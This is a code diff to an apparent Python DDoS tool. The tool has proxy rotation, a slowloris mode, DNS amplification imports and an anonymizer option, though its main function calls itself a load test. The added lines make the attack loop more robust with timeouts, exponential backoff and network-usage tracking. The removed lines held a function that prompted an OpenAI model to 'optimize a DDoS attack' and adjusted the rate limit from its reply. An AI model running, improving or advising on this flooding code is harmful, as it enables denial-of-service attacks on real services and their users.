@@ -15,37 +15,36 @@
 ### END INIT INFO ###
 
 # ================== Standard Libraries ===================
-import aiohttp # Asynchronous HTTP requests for attack simulation.
-import asyncio # Event loop for handling async tasks.
-import time # Timing functions for attack intervals.
-import argparse # Parsing command-line arguments.
-import threading # Multithreading for concurrent attacks.
-from concurrent.futures import ThreadPoolExecutor, as_completed # Managing parallel tasks.
-import random # Randomization for payloads and attack patterns.
-import json # Handling JSON configuration and outputs.
-from itertools import cycle # Cycling iterators for proxy rotation.
-from collections import deque # Efficient data handling for queues.
-from uuid import uuid4 # Unique identifiers for attack instances.
-from base64 import b64encode # Encoding payloads for attacks.
-import hashlib # Generating checksums for data integrity.
-import zlib # Compressing data for payload optimization.
-import hmac # Creating secure message digests.
-import signal # Managing process signals (e.g., interruptions).
-import sys # System-level functions (e.g., exiting on error).
-import os # Operating system-level operations.
-import subprocess # Running external commands/tools.
+import aiohttp  # Asynchronous HTTP requests for attack simulation.
+import asyncio  # Event loop for handling async tasks.
+import time  # Timing functions for attack intervals.
+import argparse  # Parsing command-line arguments.
+import threading  # Multithreading for concurrent attacks.
+from concurrent.futures import ThreadPoolExecutor, as_completed  # Managing parallel tasks.
+import random  # Randomization for payloads and attack patterns.
+import json  # Handling JSON configuration and outputs.
+from itertools import cycle  # Cycling iterators for proxy rotation.
+from collections import deque  # Efficient data handling for queues.
+from uuid import uuid4  # Unique identifiers for attack instances.
+from base64 import b64encode  # Encoding payloads for attacks.
+import hashlib  # Generating checksums for data integrity.
+import zlib  # Compressing data for payload optimization.
+import hmac  # Creating secure message digests.
+import signal  # Managing process signals (e.g., interruptions).
+import sys  # System-level functions (e.g., exiting on error).
+import os  # Operating system-level operations.
+import subprocess  # Running external commands/tools.
 import socket  # Creating and managing socket connections.
 import struct  # Handling low-level data structures.
-import logging # Logging attack progress and errors.
+import logging  # Logging attack progress and errors.
 import psutil  # Monitoring system resource usage.
 import shutil  # File operations (copy, move, execute, etc.)
 
 # ================== Third-Party Libraries ==================
-import scapy.all as scapy # Crafting and analyzing packets.
-import dns.resolver # Resolving DNS queries for amplification.
-from colorama import init, Fore, Style # Adding color to console outputs.
-from tqdm import tqdm # Displaying progress bars during attacks.
-import openai # Integrating AI-based suggestions for optimizations.
+import scapy.all as scapy  # Crafting and analyzing packets.
+import dns.resolver  # Resolving DNS queries for amplification.
+from colorama import init, Fore, Style  # Adding color to console outputs.
+from tqdm import tqdm  # Displaying progress bars during attacks.
 
 # Initialize colorama for colorized terminal output
 init(autoreset=True)
@@ -121,7 +120,6 @@ def parse_args():
     parser.add_argument("--retry", type=int, default=3, help="Number of retries for failed requests")
     parser.add_argument("-user", "--user-agents", help="File containing custom user-agent strings")
     parser.add_argument("-m", "--multi-target", help="File containing multiple target URLs or IPs")
-    parser.add_argument("-ai", "--ai-optimization", action="store_true", help="Enable AI-powered optimization")
     return parser.parse_args()
 
 def load_proxies(proxy_file: str):
@@ -329,7 +327,7 @@ async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, pr
 
                         proxy = next(proxy_pool) if proxy_pool else None
                         async with session.request(
-                            method, target_url, headers=headers, proxy=proxy, data=payload
+                            method, target_url, headers=headers, proxy=proxy, data=payload, timeout=aiohttp.ClientTimeout(total=5)
                         ) as response:
                             with requests_lock:
                                 requests_sent += 1
@@ -342,10 +340,12 @@ async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, pr
                         with requests_lock:
                             failed_requests += 1
                         logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
+                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
                     except Exception as e:
                         with requests_lock:
                             failed_requests += 1
                         logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
+                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
                 await asyncio.sleep(pause_time)
 
 async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, retry=3):
@@ -522,9 +522,10 @@ def display_status(stop_event: threading.Event, duration: int, results_file=None
                     "RPS": rps,
                     "CPU Usage": psutil.cpu_percent(),
                     "Memory Usage": psutil.virtual_memory().percent,
+                    "Network Usage": psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv,
                 }
                 results.append(stats)
-                print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f} | CPU: {stats['CPU Usage']}% | Memory: {stats['Memory Usage']}%{RESET}")
+                print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f} | CPU: {stats['CPU Usage']}% | Memory: {stats['Memory Usage']}% | Network: {stats['Network Usage']} bytes{RESET}")
             pbar.update(1)
             time.sleep(1)
 
@@ -549,54 +550,6 @@ def signal_handler(sig, frame):
     print(f"{RED}\nInterrupted by user. Exiting gracefully...{RESET}")
     stop_event.set()  # Signal all threads to stop
     sys.exit(0)
-
-def get_ai_suggestion():
-    """Get AI-powered suggestions for optimizing the attack using OpenAI's GPT model."""
-    try:
-        # Set your OpenAI API key here
-        openai.api_key = "your_openai_api_key_here"
-
-        # Create a prompt for the AI model
-        prompt = """
-        You are a cybersecurity expert. Provide suggestions to optimize a DDoS attack based on the following parameters:
-        - Number of threads: {}
-        - Pause time between requests: {}
-        - Duration: {}
-        - Attack mode: {}
-        - Rate limit: {}
-        - Proxies used: {}
-        - Payload type: {}
-        Provide actionable suggestions to improve the effectiveness of the attack.
-        """.format(args.threads, args.pause, args.duration, args.attack_mode, args.rate_limit, len(proxies) if proxies else 0, args.payload)
-
-        # Call the OpenAI API to get a suggestion
-        response = openai.Completion.create(
-            engine="text-davinci-003",  # Use the GPT-3.5 model
-            prompt=prompt,
-            max_tokens=150,  # Limit the response length
-            n=1,  # Number of suggestions to generate
-            stop=None,  # No specific stop sequence
-            temperature=0.7,  # Controls randomness (0 = deterministic, 1 = random)
-        )
-
-        # Extract the suggestion from the response
-        suggestion = response.choices[0].text.strip()
-        return suggestion
-
-    except Exception as e:
-        logging.error(f"Failed to get AI suggestion: {e}")
-        return "Unable to fetch AI suggestion. Please check your OpenAI API key and network connection."
-
-def adjust_parameters_based_on_feedback():
-    """Adjust attack parameters based on AI feedback."""
-    suggestion = get_ai_suggestion()
-    print(f"{YELLOW}AI-Powered Suggestion: {suggestion}{RESET}")
-    # Example: Adjust rate limit based on suggestion
-    if "increase rate limit" in suggestion.lower():
-        args.rate_limit += 10
-    elif "decrease rate limit" in suggestion.lower():
-        args.rate_limit -= 10
-    print(f"Adjusted rate limit to {args.rate_limit}")
 
 async def main():
     """Main function to run the load test."""
@@ -689,10 +642,6 @@ async def main():
 
     if args.results:
         print(f"{GREEN}Results saved to {args.results}{RESET}")
-
-    # Adjust parameters based on AI feedback
-    if args.ai_optimization:
-        adjust_parameters_based_on_feedback()
 
     # If --anonymizer is provided, stop anonymizer after the attack
     if args.anonymizer == "start":
